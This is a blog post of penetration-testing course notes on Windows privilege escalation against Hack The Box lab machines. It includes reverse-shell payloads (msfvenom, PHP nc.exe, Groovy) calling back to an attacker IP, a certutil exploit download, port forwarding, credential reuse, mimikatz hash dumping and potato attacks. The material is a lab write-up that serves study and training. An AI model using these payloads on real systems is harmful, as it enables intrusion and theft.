---
layout: post
title:  "Cyber Mentor Windows Privilege Escaltion Part2"
author: haran
categories: [WindowsPrivSec]
tags: [WindowsPrivSec]
image: post_img/2022/cyberMentor_windows_privesc/1/win.jpg
beforetoc: "Gain Initial foothold , System Enumeration , User Enumeration , Network Enumeration , Password Hunting , AV and Firewall Enumeration"
toc: true
---

Gain Initial foothold , System Enumeration , User Enumeration , Network Enumeration , Password Hunting , AV and Firewall Enumeration

## 08_Automated Enumeration Tools

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/1.jpg)

- Winpeas recommended , windows-exploit-suggester.py

- Sherlock powershell script which is looking for comman vulnerabilities

- Rasta Mouse released WATSON : More updated than sherlock
	- watson.sln file visualstudion we have to know the C# version to compile.


011 WinPEAS
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

011 Windows-PrivEsc-Checklist
https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

011 Sherlock
https://github.com/rasta-mouse/Sherlock

011 Watson
https://github.com/rasta-mouse/Watson

011 PowerUp
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

011 JAWS
https://github.com/411Hall/JAWS

011 Windows-Exploit-Suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

011 Metasploit-Local-Exploit-Suggester
https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/

011 Seatbelt
https://github.com/GhostPack/Seatbelt

011 SharpUp
https://github.com/GhostPack/SharpUp

## 09_Exploring Automated Tools

#### Upload winpeas using meterpreter shell
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/2.jpg)

#### winpeas executing error
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/3.jpg)

- we dont have 4.0 or latest verison of dotnet in the system

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/4.jpg)

#### Load powershell in meterpreter

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/5.jpg)

 #### Metaspolit windows local exploit suggester

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/6.jpg)

##### get system info
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/7.jpg)

#### Use windows_exploit_suggester.py

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/8.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/9.jpg)

- Install dependencies

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/10.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/11.jpg)

##### Install pip on Windows machine

```sh
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py
```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/12.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/13.jpg)

- Through dtatabase update we find out the database name

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/14.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/15.jpg)

- It suggested vulnerabilities

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/16.jpg)

>WinPeas doesnot work all the time
>Some times you want to use ==Powerup==

python3 version = https://github.com/aysebilgegunduz/Windows-Exploit-Suggester/tree/pr_version

## 10_Kernel Exploits Overview

### 10.1 What is a kernel

####  #Linux
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/17.jpg)

#### #Windows
- Converting I/O interactions to instruction set
- ==**sysinfo**== command to look the build version ,OS version

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/18.jpg)

- Windows kernel exploits - https://github.com/SecWiki/windows-kernel-exploits

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/19.jpg)

### 10.2 Escalation with metaspolit

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/20.jpg)

- Choose earlier ones great
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/21.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/22.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/23.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/24.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/25.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/26.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/27.jpg)

> - We used metaspolit exploit suggester to get kernel exploitation and successfully exploited

### 10.2 Manual Exploitation

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/28.jpg)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 lport=4444 -f aspx > manual.aspx
```

- -f = file type aspx

- Put the payload using ftp server

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/29.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/30.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/31.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/32.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/33.jpg)

#### run windows exploit suggester

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/34.jpg)

```bash
./windows-exploit-suggester.py  --database 2020-04-17-mssb.xls
--systeminfo sysinfo.txt
```

-  find the exploit by searching

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/35.jpg)

> - Chimichurri exploit well known kernel exploit

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/36.jpg)

#### Running simple python httpServer
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/37.jpg)

> - write in temp file is great
> - certutil is like wget

```bash
certutil -urlcache -f http://10.10.14.5/MS10-059.exe ms.exe
```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/38.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/39.jpg)

> - dir command used to look filesystem

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/40.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/41.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/42.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/43.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/44.jpg)

> - Here exploit already compiled for you
>
>
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/45.jpg)

## 11_Escalation Path Passwords and Port Forwading

##### OverView
- Hack the Box ChatterBox
- 10.10.10.74 = windows machine (vulnerable machine)
- 10.10.14.5 = kali machine(attack machine)

###### #nmap_results

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/46.jpg)


###### #search_using_searchsploit

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/47.jpg)


###### #copy_the_exploit
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/48.jpg)


```bash
cp /usr/share/exploitdb/exploits/windows/remote/
36025.py 3.py
```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/49.jpg)

###### #change_exploit_to_our_use
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/50.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/51.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/52.jpg)

> - This will create shellcode for us


![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/53.jpg)


- run python 3.py

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/54.jpg)

- run netcat reverse_tcp

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/55.jpg)

- we got the connection

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/56.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/57.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/58.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/59.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/60.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/61.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/62.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/63.jpg)

- psexec , winexe that can allow us to connect with machine with credentials.

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/64.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/65.jpg)

https://sushant747.gitbooks.io/total-oscp-guide/content/

- let's search for small things

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/66.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/67.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/68.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/69.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/70.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/71.jpg)

- alfred is  a low level user psexec can't work for us.
- alfred is a user who is also a admistrator login as regular account and the provide credentials to adminstration action pretty common

##### #Port_forwading

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/72.jpg)

- we can attack smb if it is available publically.
- It is an internal port.
- so we have to do port forwading

> Use tool Plink
> - Download plink https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
> - It is a command line interface for putty backend

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/73.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/74.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/75.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/76.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/77.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/78.jpg)

- edit ssh file

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/79.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/80.jpg)

- change to

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/81.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/82.jpg)

```bash
plink.exe -l root -pw toor -R 445:127.0.0.1:445
10.10.14.5

```

> - -l = username , -pw = password  ,-R = port forward
> - 445:127.0.0.1:445  10.10.14.5
>  = openned 445 port in this machine out 445 for other machine ; this allow us to access this port from our machine.

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/83.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/84.jpg)

> You are in your box within a box;this is called box seption

- Check for port forwading success

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/85.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/86.jpg)

##### #use_tool_winexe

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/87.jpg)
- this is also used in smb 445 through port forwading

```bash
winexe -U Administrator%Welcome1!
//127.0.0.1 "cmd.exe"
```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/88.jpg)

## 12_Escalation Path windows subsytsem for linux

#### #Box_Overview
- secNotes windows 10.10.10.97

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/89.jpg)


##### #Gaining_a_foot_hold

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/90.jpg)

- Three ports are open
> - 80/tcp http microsoft IIS
> - 445/tcp microsoft-ds windows10 Enterprise SMB
> - 8808/tcp http Microsofty IIS httpd

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/91.jpg)

- smb enumeration

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/92.jpg)

- Explore port 80

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/93.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/94.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/95.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/96.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/97.jpg)

> username identified tyler@secnotes.htb

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/98.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/99.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/100.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/101.jpg)

> - sniper attck make one payload for all the variables
> - pitchfork 3 different parameters for three different fields

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/102.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/103.jpg)

- Let's do the manual method

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/104.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/105.jpg)

>-  Here we get the information for everybody

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/106.jpg)

```
\\secnotes.htb\new-site
tyler / 92g!mABBGj0irKL%OG'&
```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/107.jpg)

##### #usage_psexec

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/108.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/109.jpg)

> Antivirus or something blocking this

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/110.jpg)
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/111.jpg)

- copy the netcat into the root

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/112.jpg)

- put nc.exe using smb client

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/113.jpg)

##### #use_malicious_php_file
- this is a basic reverse shell written in php

```php
<?php
system('nc.exe -e cmd.exe 10.10.14.5 4444')
?>
```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/114.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/115.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/116.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/117.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/118.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/119.jpg)

#### hint for privilege escalation
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/120.jpg)


``` ps
where /R c:\windows bash.exe
where /R c:\windows wsl.exe
```
/R = recursive

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/121.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/122.jpg)

``` ps
//   whoami
```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/123.jpg)

``` ps
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7d\bash.exe
```

- here host name is secnotes which is windows subsystem for linux.

```py
python -c "import pty;pty.spawn(''/bin/bash')"
```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/124.jpg)

#### tty escape cheatsheets

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/125.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/126.jpg)

https://netsec.ws/?p=337

- Often during pen tests you may obtain a shell without having tty, yet wish to interact further with the system. Here are some commands which will allow you to spawn a tty shell. Obviously some of this will depend on the system environment and installed packages.

**Shell Spawning**
 ``` py
python -c 'import pty; pty.spawn("/bin/sh")'
```

 ``` sh
echo os.system('/bin/bash')
```

``` sh
/bin/sh -i
```

```perl
perl —e 'exec "/bin/sh";'
```

```perl
perl: exec "/bin/sh";
```

```ruby
ruby: exec "/bin/sh"
```

```sh
lua: os.execute('/bin/sh')
```

-   (From within IRB)

```sh
exec "/bin/sh"
```

-   (From within vi)

```sh
:!bash
```

-   (From within vi)

```sh
:set shell=/bin/bash:shell
```

-   (From within nmap)

``` sh
!sh
```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/127.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/128.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/129.jpg)

- This is give us the access to the file system

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/130.jpg)

```sh
smbclient -U 'administartor%u6!4ZwgwOM#Nwnh' \\\\10.10.10.97\\c$

```

- c$ = cdrive

#### impacket github

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/131.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/132.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/133.jpg)

- smbexec.py similar thing but give half shell

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/134.jpg)
- psexec.py , smbexec.py , wmiexec.py

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/135.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/136.jpg)

``` py
smbexec.py administartor:'password'@10.10.10.97
```

## 13_Impersonation and Potato Attacks

#### Token Impersonation Overview

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/137.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/138.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/139.jpg)

Two types of tokens
- Delegate
	- some body logging in to a machine (remote desktop)
	- switch the user and login
- Impersonate
	- It is a script rather than interaction
	- attaching a network drive , domain logon script

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/140.jpg)

- when rebooting time only the tokens go away

### Token Impersonation
- Pop a shell and load incognito

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/141.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/142.jpg)

- list tokens
- I am fcastle and i want to impersonate

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/143.jpg)

- You go in to a shell you are user


### Mimikatz
![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/144.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/145.jpg)
- Attempt to dump hashes as non-Domain Admin
- which is attempt to dump LSA of the domain controller here which is HYDRA.marvel.local
- we dump all the hashes from the domain controller
- we are not domain admin so access is denied

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/146.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/147.jpg)

- Identify Domain Controller
- Adminstrator token or system token available

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/148.jpg)

- When impersonating the shell you are the adminstartor

### Attempt to dump hashes as Domain Admin

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/149.jpg)

- run mimikatz remotely
- you can dump the LSA hashes
- you can get sensitive hashes like kerbersos hashes  which is allow you to create golden ticket

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/150.jpg)


   ## Impersonate Privileges Overview

   - Let's imagine we owned a machine
   - pull down all the privileges

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/151.jpg)

- Inhere some of these are bad

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/152.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/153.jpg)

- In here several can be malicious

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/154.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/155.jpg)

- List of all kind of privileges and how they are exploitable

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/156.jpg)

https://github.com/gtworek/Priv2Admin

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/157.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/158.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/159.jpg)

- If SeAssignPrimary token use poatato.exe to get privilege escalation
- These different privileges use us to attack.

## Potato attacks overview
Read this blog to get more understanding about rotten potato attack
- https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

Overview

1.  Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.
2.  Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.
3.  Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most **service accounts** and not true of most user-level accounts.

https://github.com/ohpe/juicy-potato

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/160.jpg)

- this is another version of rotten potato

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/161.jpg)

- these are the big things we are going to look out for
SeImpersonate , SeAssignPrimaryToken

## Jeeves

#### Gaining a Foothold

```bash
Nmap scan report for 10.10.10.63                                                                                                                                  [5/25]
Host is up (0.43s latency).
Not shown: 65531 filtered ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|10 (90%), FreeBSD 6.X (86%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:freebsd:freebsd:6.2 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (90%), FreeBSD 6.2-RELEASE (86%), Microsoft Windows 10 1511 - 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h07m24s, deviation: 0s, median: 5h07m24s
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-07-09T14:54:04
|_  start_date: 2021-07-09T12:02:09

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   297.12 ms 10.10.16.1
2   532.00 ms 10.10.10.63


```

## Summary
 ```bash
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  http
```

- **Port 135** is the RPC Endpoint Mapper service. It is a service that allows other systems to discover what services are advertised on a machine and what **port** to find them on. It is mostly associated with remote access and remote management

- Port 445 smb = The Server Message Block (**SMB**) protocol is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network.

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/162.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/163.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/164.jpg)


![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/165.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/166.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/167.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/168.jpg)

``` sh
Dir found: /askjeeves/ - 200
Dir found: /askjeeves/about/ - 200
Dir found: /askjeeves/people/ - 200
Dir found: /askjeeves/assets/ - 500
Dir found: / - 200
Dir found: /askjeeves/log/ - 200
File found: /error.html - 200
Dir found: /askjeeves/computer/ - 200
Dir found: /askjeeves/log/rss/ - 200
File found: /jeeves.PNG - 200
Dir found: /askjeeves/api/ - 200
Dir found: /askjeeves/me/ - 403
Dir found: /askjeeves/logout/ - 302
Dir found: /askjeeves/api/xml/ - 200

```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/169.jpg)

- Search for groovy reverse shell

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/170.jpg)

``` C
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/171.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/172.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/173.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2022/cyberMentor_windows_privesc/2/174.jpg)

```ps
whoami
whoami /priv
```

```ps
systeminfo                                                                                                 Host Name:JEEVES
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.10586 N/A Build 10586
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00331-20304-47406-AA297
Original Install Date:     10/25/2017, 4:45:33 PM
System Boot Time:          7/9/2021, 8:01:55 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,125 MB
Virtual Memory: Max Size:  2,687 MB
Virtual Memory: Available: 1,697 MB
Virtual Memory: In Use:    990 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 10 Hotfix(s) Installed.
                           [01]: KB3150513
                           [02]: KB3161102
                           [03]: KB3172729
                           [04]: KB3173428
